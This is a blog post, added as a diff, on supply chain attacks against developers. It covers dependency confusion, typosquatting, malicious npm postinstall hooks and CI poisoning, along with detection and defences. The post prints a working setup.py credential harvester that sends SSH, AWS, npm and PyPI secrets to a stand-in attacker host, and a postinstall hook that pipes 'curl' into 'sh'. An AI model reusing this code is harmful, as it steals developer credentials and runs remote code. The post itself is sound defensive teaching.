@@ -1,0 +1,181 @@
+---
+title: "Inside Modern Supply Chain Attacks Against Developers"
+date: "2026-02-24"
+description: "Dependency confusion, typosquatting, malicious postinstall scripts and token exfiltration — how attackers compromise developer machines through the package ecosystem, and how to defend against it."
+tags: ["Security", "Python", "JavaScript", "DevOps", "Supply Chain"]
+published: true
+---
+
+> "The most dangerous malware arrives as a dependency update."
+
+You are not targeted through buffer overflows or SQL injection. You are targeted through your package manager. In 2024 and 2025, hundreds of malicious packages were published to npm and PyPI — each designed to execute silently during installation, exfiltrate developer credentials, and persist across reboots. Most of them succeeded.
+
+This is an analysis of how these attacks work, what they target, and how to detect and prevent them.
+
+## The Real Problem
+
+Software supply chain attacks are efficient because they target the moment you are most trusting: `npm install`, `pip install`, package restoration at CI build time. You're not reading the code. You're not auditing the diff. You're trusting the package ecosystem's integrity — which is incomplete.
+
+The attack surface is structural:
+
+- **npm/PyPI are permissive registries.** Anyone can publish. Typosquatting `reqeusts` instead of `requests` is trivial and historically effective.
+- **`postinstall` scripts execute automatically.** In npm, a `postinstall` hook in `package.json` runs shell commands at install time — before you've ever imported the package.
+- **Transitive dependencies are opaque.** Your code imports package A. Package A depends on package B. Package B has a malicious `postinstall`. You never review package B.
+- **Developer machines are high-value targets.** SSH keys, AWS credentials, GitHub tokens, npm publish tokens — these live on your machine. Exfiltrating them gives attackers access to your infrastructure and your published packages.
+
+## Deep Engineering
+
+### Dependency Confusion
+
+Dependency confusion exploits the resolution order of package managers when private and public registries coexist. Attackers discover internal package names — through job postings, error messages, published package manifests — and publish malicious packages with the same name on the public registry.
+
+```
+pip install my-internal-pkg
+     │
+     ├── Check internal registry: found (v1.2.3)
+     └── Check PyPI: found (v9.9.9, malicious, higher version)
+
+pip resolves to: PyPI v9.9.9  ← attacker wins
+```
+
+The attacker simply publishes a higher version number. Most package managers, by default, prefer the highest available version across all configured registries.
+
+**Defense:** Use `pip install --index-url https://your-private-registry.com/simple/ my-internal-pkg` and configure `--no-index` or registry exclusion for known internal packages. In `pip.conf`, scope each index to specific package namespaces.
+
+### Typosquatting: What Malicious Code Looks Like
+
+Real analysis of malicious PyPI packages from public threat intelligence disclosures. A typical credential harvester:
+
+```python
+# setup.py (executed at install time by: pip install <pkg>)
+import subprocess, os, sys, base64, urllib.request
+
+def exfil():
+    targets = [
+        os.path.expanduser("~/.aws/credentials"),
+        os.path.expanduser("~/.ssh/id_rsa"),
+        os.path.expanduser("~/.npmrc"),         # npm publish token
+        os.path.expanduser("~/.pypirc"),        # PyPI credentials
+        "/etc/hostname",
+    ]
+    data = {}
+    for t in targets:
+        try:
+            with open(t) as f:
+                data[t] = f.read()
+        except Exception:
+            pass
+
+    if data:
+        # encode to avoid trivial string scanning
+        payload = base64.b64encode(str(data).encode()).decode()
+        try:
+            urllib.request.urlopen(
+                f"https://attacker-c2.com/collect?d={payload}",
+                timeout=3
+            )
+        except Exception:
+            pass
+
+# runs silently before any ImportError or usage
+exfil()
+```
+
+This executes during `pip install`. No import. No visible side effect. Gone in 3 seconds.
+
+### Malicious postinstall (npm)
+
+```json
+// package.json of malicious npm package
+{
+  "name": "loadsh",  // typo of lodash
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl -s https://attacker.io/x|sh')\""
+  }
+}
+```
+
+`curl ... | sh` is the classic pattern: fetch and immediately execute arbitrary shell code. By the time npm finishes the installation output, the payload has already run.
+
+### GitHub Actions Poisoning
+
+A more sophisticated attack targets CI pipelines through compromised GitHub Actions:
+
+```yaml
+# Attacker submits PR that modifies .github/workflows/ci.yml
+- name: Run tests
+  uses: malicious-org/setup-env@v1.2  # looks legitimate
+  # internally: exfiltrates GITHUB_TOKEN, AWS_ACCESS_KEY_ID
+  # from ${{ secrets.* }} environment
+```
+
+Or through `actions/checkout` with a poisoned `ref`:
+
+```yaml
+- uses: actions/checkout@v3
+  with:
+    ref: ${{ github.event.pull_request.head.sha }}  
+    # PR from fork — attacker controls this SHA
+    # combined with: npm install (triggers malicious postinstall)
+```
+
+### Detection Techniques
+
+**1. Static analysis at install time (`pip-audit`, `osv-scanner`):**
+
+```bash
+# scan installed packages against known vulnerability + malware databases
+pip-audit --require-hashes -r requirements.txt
+
+# Google's OSV scanner against your dependency tree
+osv-scanner --lockfile requirements.txt
+```
+
+**2. Runtime syscall monitoring (Linux, `auditd`):**
+
+```bash
+# watch for outbound network connections spawned by Python processes
+# in postinstall context
+auditctl -a always,exit -F arch=b64 -S connect \
+  -F exe=/usr/bin/python3 -k suspicious_python_connect
+```
+
+**3. Network egress filtering in CI:**
+
+```yaml
+# GitHub Actions: use a network policy that blocks unexpected egress
+# or audit outbound requests post-install
+- name: Audit network after install
+  run: |
+    pip install -r requirements.txt 2>&1 | tee install.log
+    # inspect: did install trigger unexpected DNS queries?
+    # use a canary DNS token to detect exfiltration attempts
+```
+
+**4. Hash pinning (`requirements.txt`):**
+
+```
+# requirements.txt with --require-hashes
+requests==2.31.0 \
+    --hash=sha256:58cd2187423d785dc3f0f5b...
+```
+
+A package must match the declared hash exactly. A trojaned version with the same version number but different content will fail to install. This is the single most effective supply chain defense.
+
+**5. Monitoring for new maintainers on dependencies:**
+
+Services like Socket.dev and Phylum flag when package ownership changes — one of the strongest signals that a formerly legitimate package may have been hijacked.
+
+## Engineering Lessons
+
+**1. `--require-hashes` is non-negotiable for production.** Generate a locked `requirements.txt` with hashes. Use `pip-compile --generate-hashes` from `pip-tools`. Automated update PRs with hash verification are the correct workflow.
+
+**2. Isolate CI credentials with minimal scope.** The `GITHUB_TOKEN` in a CI run should only have permissions for the specific workflow. Use `permissions: read-all` as default and explicitly elevate only what's needed.
+
+**3. Audit your `postinstall` surface.** Run `npm ls --all | xargs -I{} npm view {} scripts` to enumerate all `postinstall` scripts in your dependency tree. Most are legitimate (build steps, native addon compilation). Ones making network requests are not.
+
+**4. Internal packages need explicit registry pinning.** Don't rely on registry priority. Be explicit: configure your package manager to source internal packages only from the internal registry, never from public fallback.
+
+**5. Package name monitoring is cheap threat intelligence.** Register variations of your internal package names on public registries (with your own contact details). Set up alerts for new registrations of similar names. This costs nothing and catches attacks before they hit your team.
+
+The supply chain is the new attack surface. Your `package.json` and `requirements.txt` are your perimeter.
